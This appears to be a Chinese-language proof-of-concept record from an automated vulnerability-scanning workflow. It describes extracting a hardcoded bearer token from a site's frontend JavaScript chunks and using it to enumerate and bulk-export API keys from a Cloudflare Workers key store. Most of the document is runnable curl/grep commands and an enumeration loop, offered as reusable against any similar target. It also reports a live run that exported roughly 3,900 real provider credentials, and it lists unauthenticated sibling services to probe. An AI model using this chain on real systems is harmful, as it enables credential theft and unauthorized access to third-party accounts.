# 前端 chunk 硬编码凭据 → 共享钥匙 → 密钥库路径枚举批量导出

- **code**: 前端-chunk-硬编码凭据-共享钥匙-密钥库路径枚举批量导出
- **kind**: script
- **category**: unauthorized
- **component**: Cloudflare Workers 密钥库服务（keyvalue / local-apikeys 命名）
- **versions**: 服务端自研，无版本号
- **severity**: critical
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 codex-tgt4796-com 靶标上实测：凭据来自 example.com chunk 164cf676da3d83a8.js 的明文 `Authorization: Bearer sk-keyvalue-os`；对 https://example.com 下 11 条路径返回 200，导出约 3900 条真实上游凭据（openrouter 3171 / gemini 429 / groq 111 / openai 89 / nebius 57 / vertex 41 个 GCP 凭证对象 / xai 8 / novita 11 / deepseek 1 / target78.example.com 1 / replicate 1）。对照：无头 401、错值 403。对应 vuln id 19、credential id 4-13、chain seq 15-17。
- **path**: pocs/前端-chunk-硬编码凭据-共享钥匙-密钥库路径枚举批量导出/frontend-hardcoded-cred-to-keystore-enum.md
- **tags**: 前端硬编码,凭据泄露,密钥库,Cloudflare Workers,路径枚举,未授权访问
- **created_at**: 2026-09-29T22:28:17.522Z
- **found_by**: vuln-scan

## 描述

从目标站前端 chunk 提取硬编码的密钥库共享凭据，按 <provider>-local-apikeys 命名模式枚举出全部密钥库并批量导出生产 API Key。可复用于任何「前端打包 + Cloudflare Workers 自研服务」结构的靶标。

## 用法

```
1) 枚举目标站 chunk 并正则搜调用点取硬编码凭据；2) 三态对照确认「共享钥匙」；3) 按 <provider>-<suffix> 模式横向枚举路径；4) 逐个固证落盘并统计条数。替换 TARGET / HOST / <leaked>。
```

## 正文

```
# 手法链路：前端 chunk 硬编码凭据 → 共享钥匙 → 密钥库路径枚举 → 批量导出

## 1. 定位调用点（前端 chunk 正则）
目标站若为 Next.js/Vite 打包，先枚举其全部 chunk 再正则搜调用点，**不要只搜根页面**：

```bash
# 取页面引用的 chunk 列表
curl -s https://TARGET/ | grep -oE '(?:src|href)="(/[^"]+\.js[^"]*)"' | sort -u
# 逐个下载后，用「上下文关键词 + 宽松值正则」搜（关键：值长度下限放到 4-8，短密钥极易漏）
grep -oE '(Bearer|Authorization|X-API-Token|api[_-]?key|token|secret)[^,;"]{0,40}["'"'"']?[A-Za-z0-9_\-\.]{4,80}' CHUNK.js
```

命中形态（真实案例）：
```js
r = "https://example.com/".concat(this.APIKEY_PATH);
await fetch(r, { headers: { Authorization: "Bearer sk-keyvalue-os" } });
// 同文件 constructor 内 APIKEY_PATH = "falai-local-apikeys" / "replicate-local-apikeys"
```

## 2. 凭据即共享钥匙：验证 + 判型
```bash
# 无头 / 错值 / 正确值 三态对照，快速判定该头是不是「共享钥匙」
curl -s -o /dev/null -w '%{http_code}\n' https://HOST/                                   # 401
curl -s -o /dev/null -w '%{http_code}\n' https://HOST/ -H 'Authorization: junk'           # 403 Bad apikey
curl -s https://HOST/<known_path> -H 'Authorization: Bearer <leaked>'                     # 200 → 共享钥匙
```
判据：**单个鉴权头对多个不同路径全部放行 = 共享钥匙**（不是按用户维度隔离的 token）。

## 3. 路径枚举（收益最大化的一步）
从前端拿到的已知路径反推命名模式，再横向铺开：
- 模式：`<provider>-local-apikeys` / `<provider>-local-keys`
- provider 面：openai / anthropic / gemini / vertex / xai / grok / deepseek / groq / openrouter / nebius / novita / siliconflow / mistral / together / cohere / perplexity / fireworks / moonshot / qwen / zhipu / minimax / replicate / falai / midjourney / suno / runway / elevenlabs / azure / bedrock …
- 后缀变体：`-apikeys` `-keys` `-local-keys` `-api-keys` `-local-tokens` `-token` `-tokens`
- 无前缀通用：`local-apikeys` `apikeys` `keys` `all-apikeys` `secrets` `credentials`

```bash
for p in openai anthropic gemini vertex xai deepseek groq openrouter nebius novita; do
  code=$(curl -s -o /tmp/$p.txt -w '%{http_code}' "https://HOST/$p-local-apikeys" -H "Authorization: Bearer <leaked>")
  [ "$code" = "200" ] && echo "HIT $p $(wc -c </tmp/$p.txt)"
done
```

## 4. 常见兄弟服务（同一作者的 Worker 群）
发现一个 Worker 后，用证书透明度/子域枚举拿同域下所有 Worker 子域，逐个探根路径判型：
- `apikeydbserver` / `apikey-cookiedb` —— 密钥库旁路服务
- `kv-line-operation` —— **`GET /get?key=<storagekey>` 无鉴权读 KV**，只差 key 名（key 名同样从前端 chunk 找）
- `mailbackend` / `taobaomail-backend` —— cloudflare_temp_email，`/open_api/settings` 常无鉴权
- `api-manager` —— 管理面板，`/api/external/*` 用另一套 `X-API-Token`（尝试用同一前端 chunk 找）

## 5. 判型要点（避免误判）
- CF Worker 的 401 vs 403 语义不同：401=缺头、403=值错 → **说明是精确比对，不是弱校验**
- 静态兜底会让任意路径返回 200 HTML：**用 Content-Type / 内容特征区分真实命中**，别把 SPA 兜底当成果
- 同目标多路径命中时，**记分口径按「同一系统只算最高一条」**，及时换目标/换类别推进
```
